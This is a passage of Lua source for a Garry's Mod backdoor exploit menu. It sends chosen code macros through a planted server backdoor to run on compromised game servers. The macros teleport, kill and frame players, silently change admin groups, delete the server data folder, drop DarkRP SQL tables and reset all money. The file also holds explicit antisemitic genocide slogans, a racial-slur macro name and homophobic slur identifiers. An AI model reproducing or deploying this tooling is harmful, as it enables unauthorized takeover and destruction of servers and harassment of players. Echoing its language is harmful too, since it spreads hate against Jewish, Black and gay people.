            for _, p in pairs(player.GetAll()) do if %LP then p:SetPos( tpos ) end end

        ]],
        ["Desc"] = "Teleport yourself to the selected player, may end with you stuck inside a wall"
    },
    ["Teleport (blink)"] = {
        ["Type"] = 2,
        ["Code"] = [[

            local tpos = v:GetEyeTraceNoCursor().HitPos

            v:SetPos( tpos )

        ]],
        ["Desc"] = "Use on yourself or others to warp them to where they are looking"
    },
    ["Spawn entity near player"] = {
        ["Type"] = 2,
        ["Code"] = [[

        local tr = {}

        tr.start = v:GetShootPos()

        tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

        tr.filter = {v}

        local trace = util.TraceLine(tr)

        local dix = ents.Create( @1 )

        dix:SetPos(trace.HitPos)

        dix:SetAngles(Angle(0,0,0))

        dix:Spawn()

        ]],
        ["Desc"] = "Spawn an entity in front of this player (first parameter = entity class), cannot spawn cars!",
        ["NeedsParameters"] = 1
    },
    ["Spawn prop near player"] = {
        ["Type"] = 2,
        ["Code"] = [[

        local tr = {}

        tr.start = v:GetShootPos()

        tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

        tr.filter = {v}

        local trace = util.TraceLine(tr)

        local dix = ents.Create( "prop_physics" )

        dix:SetPos(trace.HitPos)

        dix:SetAngles(Angle(0,0,0))

        dix:SetModel( @1 )

        dix:Spawn()

        ]],
        ["Desc"] = "Spawn a world prop in front of this player (first parameter = model)",
        ["NeedsParameters"] = 1
    },
    ["Spawn evil npc near player"] = {
        ["Type"] = 2,
        ["Code"] = [[

        local tr = {}

        tr.start = v:GetShootPos()

        tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

        tr.filter = {v}

        local trace = util.TraceLine(tr)

        local dix = ents.Create( "npc_citizen" )

        dix:SetPos(trace.HitPos)

        dix:SetAngles(Angle(0,0,0))

        dix:SetKeyValue( "additionalequipment", table.Random({"weapon_shotgun", "weapon_smg1", "weapon_ar2"}) )

        dix:SetKeyValue( "citizentype", 3 )

        dix:AddRelationship("player D_HT 200")

        dix:SetCurrentWeaponProficiency(WEAPON_PROFICIENCY_PERFECT)

        dix:SetSchedule( SCHED_IDLE_WANDER )

        dix:Spawn()

        ]],
        ["Desc"] = "Spawn a hostile NPC in front of this player"
    },
    ["Death ray"] = {
        ["Type"] = 2,
        ["Code"] = [[

        local trace = v:GetEyeTraceNoCursor()

        if trace.Entity:IsValid() then trace.Entity:Remove() end

        ]],
        ["Desc"] = "Vaporize whatever this player is looking at"
    },
    ["Death ray (explosive)"] = {
        ["Type"] = 2,
        ["Code"] = [[

        local trace = v:GetEyeTraceNoCursor()

        local explo = ents.Create("env_explosion")

        explo:SetPos(trace.HitPos)

        explo:SetKeyValue("iMagnitude", "250")

        explo:Spawn()

        explo:Activate()

        explo:Fire("Explode", "", 0)

        ]],
        ["Desc"] = "Blow up whatever this player is looking at"
    },
    ["Precise Artillery Strike"] = {
        ["Type"] = 2,
        ["Code"] = [[

        local trace = v:GetEyeTraceNoCursor()

        timer.Create( "uiashfuasfas"..v:UniqueID()..math.random(-9999, 99999), 0.2, 15, function()

        local explo = ents.Create("env_explosion")

        explo:SetPos(trace.HitPos + Vector( math.random( -500, 500), math.random( -500, 500), math.random( -500, 500) ) )

        explo:SetKeyValue("iMagnitude", "250")

        explo:Spawn()

        explo:Activate()

        explo:Fire("Explode", "", 0)

        end)

        ]],
        ["Desc"] = "Blow up whatever this player is looking at"
    },
    ["Woman Driver"] = {
        ["Type"] = 2,
        ["Code"] = [[

        local trace = v:GetEyeTraceNoCursor()

        local car = ents.Create("prop_physics")

        local trace2 = util.TraceLine( { start = trace.HitPos, endpos = trace.HitPos + Vector( 0, 0, 5000000 ), mask = MASK_SOLID_BRUSHONLY } )

        car:SetModel( "models/props_vehicles/car002a_physics.mdl" )

        car:SetAngles( v:GetAngles() )

        car:SetPos( trace2.HitPos + Vector( 0, 0, -60 ) )

        car:Spawn()

        car:Activate()

        car.boom = 6

        car:GetPhysicsObject():SetVelocity( Vector( 0, 0, -5000 ) )

        car:Ignite( 500 )

        car:AddCallback( "PhysicsCollide", function( car, dat )

            local explo = ents.Create("env_explosion")

            explo:SetPos( car:GetPos() )

            explo:SetKeyValue("iMagnitude", "350")

            explo:Spawn()

            explo:Activate()

            explo:Fire("Explode", "", 0)

            local ef = EffectData()

            ef:SetOrigin( car:GetPos() )

            ef:SetMagnitude( 5 )

            ef:SetScale( 200 )

            util.Effect( "ThumperDust", ef )

            car.boom = car.boom - 1

            if car.boom < 0 then car:Remove() end

        end )

        timer.Simple( 30, function() if car:IsValid() then car:Remove() end end)

        ]],
        ["Desc"] = "Make exploding vehicles rain from the sky"
    },
    ["Poison Gas"] = {
        ["Type"] = 2,
        ["Code"] = [[

        local trace = v:GetEyeTraceNoCursor()

        local ar2Explo = ents.Create("env_ar2explosion")

        ar2Explo:SetOwner(game.GetWorld())

        local p = trace.HitPos

        ar2Explo:SetPos(trace.HitPos)

        ar2Explo:Spawn()

        ar2Explo:Activate()

        ar2Explo:Fire("Explode", "", 0)

        timer.Create( "gasthekikes_"..math.random(-9999, 9999).."_"..math.random(-9999, 9999), 0.25, 35, function()

            for _, ent in pairs(ents.FindInSphere( p, 500)) do

                if !ent:IsPlayer() then continue end

                local d = DamageInfo()

                d:SetDamage( 1 )

                d:SetAttacker( game.GetWorld() )

                d:SetInflictor( game.GetWorld() )

                d:SetDamageType( DMG_DROWN )

                ent:TakeDamageInfo( d )

            end

        end)



        ]],
        ["Desc"] = "GAS THE JEWS RACE WAR NOW"
    },
    ["Spawn vehicle near player"] = {
        ["Type"] = 2,
        ["Code"] = [[

        local trc = {}

        trc.start = v:GetShootPos()

        trc.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

        trc.filter = {v}

        local tr = util.TraceLine(trc)



        local VehicleList = list.Get( "Vehicles" )

        local vehicle = VehicleList[ @1 ]

        if ( !vehicle ) then return end

        local Angles = v:GetAngles()

        Angles.pitch = 0

        Angles.roll = 0

        Angles.yaw = Angles.yaw + 180

    

        local pos = tr.HitPos

        if ( vehicle.Offset ) then

            pos = pos + tr.HitNormal * vehicle.Offset

        end

        local Ent = ents.Create( vehicle.Class )

        if ( !Ent ) then return end

        duplicator.DoGeneric( Ent, vehicle )

        if ( vehicle.Model == "models/buggy.mdl" ) then Ent:SetKeyValue( "vehiclescript", "scripts/vehicles/jeep_test.txt" ) end

        if ( vehicle.Model == "models/vehicle.mdl" ) then Ent:SetKeyValue( "vehiclescript", "scripts/vehicles/jalopy.txt" ) end

        if ( vehicle && vehicle.KeyValues ) then

            for k, v in pairs( vehicle.KeyValues ) do

                Ent:SetKeyValue( k, v )

            end

        end

        Ent:SetModel( vehicle.Model )

        Ent:SetAngles( Angles )

        Ent:SetPos( pos )

        Ent:Spawn()

        Ent:Activate()

        if ( Ent.SetVehicleClass && @1 ) then Ent:SetVehicleClass( @1 ) end

        Ent.VehicleName = vehicle.Class

        Ent.VehicleTable = @1

        Ent.ClassOverride = vehicle.Class

        ]],
        ["Desc"] = "Spawn a vehicle in front of this player (first parameter = vehicle class), don't try to spawn ents with this ya dingus!",
        ["NeedsParameters"] = 1
    },
    ["Kick player"] = {
        ["Type"] = 2,
        ["Code"] = [[ v:Kick( @1 ) ]],
        ["Desc"] = "First parameter = reason for kick"
    },
    ["Niggerize player"] = {
        ["Type"] = 2,
        ["Code"] = [[ if !v.Niggered then v:SetColor( Color( 0, 0, 0 ) ) v.Niggered = true else v:SetColor( Color(255, 255, 255) ) v.Niggered = false end ]],
        ["Desc"] = "Turns them black as night"
    },
    ["Cloak player"] = {
        ["Type"] = 2,
        ["Code"] = [[ if !v.BDCloaked then v:SetRenderMode( RENDERMODE_NONE ) v.BDCloaked = true else v:SetRenderMode( RENDERMODE_NORMAL ) v.BDCloaked = false end ]],
        ["Desc"] = "Toggles cloaking on the player, people can still see the weapon they are holding however"
    },
    ["Allahu Ackbar"] = {
        ["Type"] = 2,
        ["Code"] = [[

        local explo = ents.Create("env_explosion")

        explo:SetOwner(v)

        explo:SetPos(v:GetPos())

        explo:SetKeyValue("iMagnitude", "250")

        explo:Spawn()

        explo:Activate()

        explo:Fire("Explode", "", 0)

        if v:Alive() then v:Kill() end

        ]],
        ["Desc"] = "Blows them the fuck up, all kills are attributed to them so its great for getting random assholes banned"
    },
    ["ULX set access"] = {
        ["Type"] = 2,
        ["Code"] = [[ local userInfo = ULib.ucl.authed[ v:UniqueID() ] ULib.ucl.addUser( v:UniqueID(), userInfo.allow, userInfo.deny, @1 ) ]],
        ["Desc"] = "If ulx is installed this will (silently!) set them to the specified usergroup (1st parameter)",
        ["NeedsParameters"] = 1
    },
    ------------------------ dangerous codens ------------------------
    ["DarkRP clear all money"] = {
        ["Type"] = 3,
        ["Code"] = [[RunConsoleCommand("rp_resetallmoney")]],
        ["Desc"] = "Kids will cry to the admins for the next week about losing their precious money"
    },
    ["Cleanup map"] = {
        ["Type"] = 3,
        ["Code"] = [[game.CleanUpMap()]],
        ["Desc"] = "Wipe the map clean, taking everybodys cars, printers and bases out"
    },
    ["Vaporize all players"] = {
        ["Type"] = 3,
        ["Code"] = [[for k, v in pairs(player.GetAll()) do v:Remove() end]],
        ["Desc"] = "Deletes their player entity, leaving them staring at a wall of errors"
    },
    ["FPP Unrestrict everything"] = {
        ["Type"] = 3,
        ["Code"] = [[FPP.Blocked = {} FPP.BlockedModels = {} FPP.RestrictedTools = {} FPP.RestrictedToolsPlayers = {} ]],
        ["Desc"] = ""
    },
    ["Wipe data folder"] = {
        ["Type"] = 3,
        ["Code"] = [[local files, directories = file.Find( "*", "DATA" ) for k, v in pairs( files ) do file.Delete( v ) end ]],
        ["Desc"] = "Wipe the servers data folder, fucking all their settings and stuff up"
    },
    ["Wipe DarkRP SQL Tables"] = {
        ["Type"] = 3,
        ["Code"] = [[ MySQLite.query ('DROP TABLE darkrp_player' MySQLite.query('CREATE TABLE IF NOT EXISTS darkrp_player(idx INTEGER NOT NULL)') ]],
        ["Desc"] = "Completely fucks darkrp, forces them to reinstall the entire server"
    }
}

local selectedbackdoor = ""
local backdoorargs = ""
local selectedplayers = {}

function BD.GenerateBackdoorList(parent, category)
    for k, v in SortedPairs(BD.BDMacros, false) do
        if v["Type"] ~= category then continue end
        local plypanel2 = vgui.Create("DPanel")
        plypanel2:SetPos(0, 0)
        plypanel2:SetSize(200, 25)

        -- Paint function
        plypanel2.Paint = function()
            draw.RoundedBoxEx(8, 1, 1, plypanel2:GetWide(), plypanel2:GetTall(), Color(0, 0, 0, 150), false, false, false, false)

            if selectedbackdoor == k then
                surface.SetDrawColor(Color(70, 130, 180, 255))
            else
                surface.SetDrawColor(Color(0, 0, 0, 255))
            end

            surface.DrawOutlinedRect(1, 1, plypanel2:GetWide() - 1, plypanel2:GetTall() - 1)
        end

        local plyname = vgui.Create("DLabel", plypanel2)
        plyname:SetPos(10, 5)
        plyname:SetFont("Trebuchet18")
        local tcol = Color(255, 255, 255)

        if v.Private then
            tcol = Color(155, 255, 155)
        end

        plyname:SetColor(tcol)
        plyname:SetText(k)
        plyname:SetSize(180, 15)
        local faggot = vgui.Create("DButton", plypanel2)
        faggot:SetSize(plypanel2:GetWide(), plypanel2:GetTall())
        faggot:SetPos(0, 0)
        faggot:SetText("")

        if v["Desc"] ~= "" then
            faggot:SetToolTip(v["Desc"])
        end

        faggot.Paint = function(panel, w, h) return end

        faggot.DoClick = function()
            selectedbackdoor = k
        end

        parent:AddItem(plypanel2)
    end
end

function BD.FormatCodeTargeted()
    if selectedbackdoor == "" then
        BD.ChatText("You haven't selected a macro to use!", Color(255, 155, 155))

        return
    end

    local param = string.Explode(",", backdoorargs)
    local ids = {}

    for k, v in pairs(selectedplayers) do
        if not v:IsValid() then
            table.RemoveByValue(selectedplayers, v)
            continue
        end

        table.insert(ids, v:UniqueID())
    end

    local code = [[ local targets = ## for k, v in pairs( player.GetAll() ) do if !v:IsValid() then continue end if table.HasValue( targets, v:UniqueID() ) then %% end end ]]
    code = string.Replace(code, "##", table.ToString(ids))
    code = string.Replace(code, "%%", BD.BDMacros[selectedbackdoor]["Code"] or "")
    code = string.Replace(code, "%LP", "p:UniqueID() == \"" .. LocalPlayer():UniqueID() .. "\"")

    if BD.BDMacros[selectedbackdoor]["NeedsParameters"] and (BD.BDMacros[selectedbackdoor]["NeedsParameters"] > #param or param[1] == "") then
        BD.ChatText("This macro requires parameters to work! check its description for more info", Color(255, 155, 155))

        return
    end

    if #param < 1 then
        param = {
            [1] = "derp",
            [2] = "derp",
            [3] = "derp",
            [4] = "derp",
            [5] = "derp"
        }
    end

    for k, v in pairs(param) do
        code = string.Replace(code, "@" .. k, [["]] .. v .. [["]])
    end

    BD.Fire(code)
end

function BD.FormatCodeGlobal()
    if selectedbackdoor == "" then
        BD.ChatText("You haven't selected a macro to use!", Color(255, 155, 155))

        return
    end

    local param = string.Explode(",", backdoorargs)
    local code = BD.BDMacros[selectedbackdoor]["Code"]

    if BD.BDMacros[selectedbackdoor]["NeedsParameters"] and (BD.BDMacros[selectedbackdoor]["NeedsParameters"] > #param or param[1] == "") then
        BD.ChatText("This macro requires parameters to work! check its description for more info", Color(255, 155, 155))

        return
    end

    if #param < 1 then
        param = {
            [1] = "derp",
            [2] = "derp",
            [3] = "derp",
            [4] = "derp",
            [5] = "derp"
        }
    end

    for k, v in pairs(param) do
        code = string.Replace(code, "@" .. k, [["]] .. v .. [["]])
        code = string.Replace(code, "%LP", LocalPlayer():UniqueID())
        code = string.Replace(code, "%LCP", "p:UniqueID() == \"" .. LocalPlayer():UniqueID() .. "\"")

        for k, v in pairs(BackDoor_net) do
            code = string.Replace(code, "%BD", v.NetWork)
        end
    end

    BD.Fire(code)
end

local safenet = net

local function bdnet()
    if R8 and R8.G then return R8.G.net end

    return safenet
end

function BD.Fire(code)
    local cbd = BD.CurrentBackdoor
    local key = BD.BackdoorTypes[cbd].Netkey
    bdnet().Start(key)
    bdnet().WriteString(code)
    bdnet().SendToServer()
end

surface.CreateFont("exitmenu", {
    font = "Arial",
    size = 20,
    weight = 1000,
    shadow = false,
    outline = false
})

local function exitmenu(panel, X, y)
    local CButton = vgui.Create("DButton", panel)
    CButton:SetTextColor(Color(150, 150, 150))
    CButton:SetText("РҐ")
    CButton:SetFont("exitmenu")
    CButton:SetPos(X, y)
    CButton:SetSize(50, 24)

    CButton.DoClick = function()
        panel:SizeTo(0, 0, .2, 0, .2)

        timer.Simple(0.3, function()
            panel:SetVisible(false)
        end)
    end

    CButton.Paint = function(panel, w, h)
        surface.SetDrawColor(Color(0, 0, 0, 255))
        surface.DrawOutlinedRect(0, 0, CButton:GetSize())
        draw.RoundedBox(0, 0, 0, w, h, Color(139, 0, 0, 255))
    end

    CButton.OnCursorEntered = function(self)
        surface.PlaySound("garrysmod/ui_hover.wav")

        CButton.Paint = function(panel, w, h)
            draw.RoundedBox(0, 0, 0, w, h, Color(220, 20, 60, 255))
        end
    end

    -------------------------------------------------------------
    CButton.OnCursorExited = function(self)
        CButton.Paint = function(panel, w, h)
            draw.RoundedBox(0, 0, 0, w, h, Color(139, 0, 0, 255))
        end
    end
    ------------------------------------------------------------------------
end

local blur = Material("pp/blurscreen")

local function DrawBlur(panel, amount)
    local x, y = panel:LocalToScreen(0, 0)
    local scrW, scrH = ScrW(), ScrH()
    surface.SetDrawColor(255, 255, 255)
    surface.SetMaterial(blur)

    for i = 1, 3 do
        blur:SetFloat("$blur", (i / 3) * (amount or 6))
        blur:Recompute()
        render.UpdateScreenEffectTexture()
        surface.DrawTexturedRect(x * -1, y * -1, scrW, scrH)
    end
end

CreateClientConVar("menu_r", "148", true, false)
CreateClientConVar("menu_g", "0", true, false)
CreateClientConVar("menu_b", "211", true, false)

function BD.BackdoorMenu()
    BD.Backdoors = BD.PingBackDoors()
    local BDMenu = vgui.Create("DFrame")
    BDMenu:Center()
    BDMenu:SizeTo(500, 400, .3, 0, .3)
    exitmenu(BDMenu, 449, 1)
    BDMenu:SetTitle(" ")
    BDMenu:ShowCloseButton(false)
    BDMenu:SetVisible(true)
    BDMenu:MakePopup()

    function BDMenu:Paint()
        DrawBlur(self, 5)
        draw.RoundedBox(4, 0, 0, 5000, 5000, Color(GetConVarNumber("menu_r"), GetConVarNumber("menu_g"), GetConVarNumber("menu_b"), 170))
        surface.SetDrawColor(Color(0, 0, 0, 255))
        surface.DrawOutlinedRect(0, 0, BDMenu:GetSize())
        ---------------------------------------------------------
        --draw.SimpleText( "Player's", "exitmenu", 320, 25	, Color( 255, 255, 255, 200 ), 0, 0  )
        ---------------------------------------------------------
        surface.DrawOutlinedRect(0, 25, BDMenu:GetSize())
        -------------------------------------------------
        surface.DrawOutlinedRect(0, 0, 449, 26)
        --surface.DrawOutlinedRect( -6, 25, BDMenu:GetSize() )
        --
        --surface.DrawOutlinedRect( 0, -6, BDMenu:GetSize() )
        ------------------------------------------------
    end

    local it = 145
    local Plist = vgui.Create("DPanelList", BDMenu)
    Plist:SetPos(5, 30)
    Plist:SetSize(200, 315)
    Plist:SetPadding(5)
    Plist:SetSpacing(5)
    Plist:EnableHorizontal(false)
    Plist:EnableVerticalScrollbar(true)
    Plist:SetName("")

    Plist.Paint = function(self, w, h)
        DrawBlur(self, 5)
        draw.RoundedBox(4, 0, 0, 5000, 5000, Color(GetConVarNumber("menu_r"), GetConVarNumber("menu_g"), GetConVarNumber("menu_b"), 170))
        surface.SetDrawColor(Color(0, 0, 0, 255))
        surface.DrawOutlinedRect(0, 0, BDMenu:GetSize())
    end

    local Plist4 = vgui.Create("DPanelList", BDMenu)
    Plist4:SetPos(210, 30)
    Plist4:SetSize(285, 315)
    Plist4:SetPadding(5)
    Plist4:SetSpacing(5)
    Plist4:EnableHorizontal(false)
    Plist4:EnableVerticalScrollbar(true)
    Plist4:SetName("")

    Plist4.Paint = function(self, w, h)
        surface.SetDrawColor(50, 50, 50, 255)
        surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor(0, 0, 0, 200)
        surface.DrawRect(0, 0, w, h)
    end

    local faggot = vgui.Create("DButton", BDMenu)
    faggot:Dock(5)
    faggot:SetText("Activate Backdoor!")
    faggot:SetTextColor(Color(255, 255, 255, 255))

    faggot.Paint = function(panel, w, h)
        draw.RoundedBox(0, 0, 0, 500, 500, Color(0, 0, 0, 120))
        surface.SetDrawColor(Color(0, 0, 0, 255))
        surface.DrawOutlinedRect(0, 0, faggot:GetSize())
        surface.DrawOutlinedRect(0, 25, faggot:GetSize())
    end

    faggot.DoClick = function()
        if not BD.BDMacros[selectedbackdoor] or selectedbackdoor == "" then
            BD.ChatText("You haven't even selected a macro to use ya dingus!", Color(255, 155, 155))

            return
        end

        if BD.BDMacros[selectedbackdoor].Type == (1 or 3) then
            BD.FormatCodeGlobal()
        else
            BD.FormatCodeTargeted()
        end

        surface.PlaySound("buttons/button18.wav")
    end

    local moonman = vgui.Create("DTextEntry", BDMenu)
    moonman:Dock(5)
    moonman:DockMargin(0, 0, 0, 5)
    moonman:SetText(backdoorargs)

    moonman.OnChange = function(self)
        backdoorargs = self:GetValue()
    end

    --    surface.PlaySound("buttons/button3.wav")
    -- players list
    for k, v in pairs(player.GetAll()) do
        local plypanel2 = vgui.Create("DPanel")
        plypanel2:SetPos(0, 0)
        plypanel2:SetSize(200, 25)

        -- Paint function
        plypanel2.Paint = function()
            draw.RoundedBoxEx(8, 1, 1, plypanel2:GetWide(), plypanel2:GetTall(), Color(0, 0, 0, 150), false, false, false, false)

            if table.HasValue(selectedplayers, v) then
                surface.SetDrawColor(Color(50, 255, 90, 255))
            else
                surface.SetDrawColor(Color(50, 50, 90, 255))
            end

            surface.DrawOutlinedRect(1, 1, plypanel2:GetWide() - 1, plypanel2:GetTall() - 1)
        end

        local plyname = vgui.Create("DLabel", plypanel2)
        plyname:SetPos(10, 5)
        plyname:SetFont("Trebuchet18")
        local tcol = Color(255, 255, 255)

        if v == LocalPlayer() then
            tcol = Color(155, 155, 255)
        end

        --  elseif BD.IsFriend( v ) then tcol = Color( 0, 255, 0 )
        --    elseif BD.GetRank(v) != ( "user" or "guest" or "player" ) then tcol = Color( 255, 100, 0 ) end
        plyname:SetColor(tcol)
        plyname:SetText(v:Nick())
        plyname:SetSize(180, 15)
        local faggot = vgui.Create("DButton", plypanel2)
        faggot:SetSize(plypanel2:GetWide(), plypanel2:GetTall())
        faggot:SetPos(0, 0)
        faggot:SetText("")
        faggot.Paint = function(panel, w, h) return end

        faggot.DoClick = function()
            if table.HasValue(selectedplayers, v) then
                table.RemoveByValue(selectedplayers, v)
            else
                table.insert(selectedplayers, v)
            end
        end

        Plist4:AddItem(plypanel2)
    end

    BD.GenerateBackdoorList(Plist, 1)
    BD.GenerateBackdoorList(Plist, 2)
    BD.GenerateBackdoorList(Plist, 3)
end

concommand.Add("bd_menu", BD.BackdoorMenu)

function BD.QuickFireBackdoor()
    if not BD.BDMacros[selectedbackdoor] or selectedbackdoor == "" then
        BD.ChatText("You haven't even selected a macro to use ya dingus!", Color(255, 155, 155))

        return
    end

    if BD.BDMacros[selectedbackdoor].Type == (1 or 3) then
        BD.FormatCodeGlobal()
    else
        BD.FormatCodeTargeted()
    end
end

concommand.Add("bd_quickfire", BD.QuickFireBackdoor)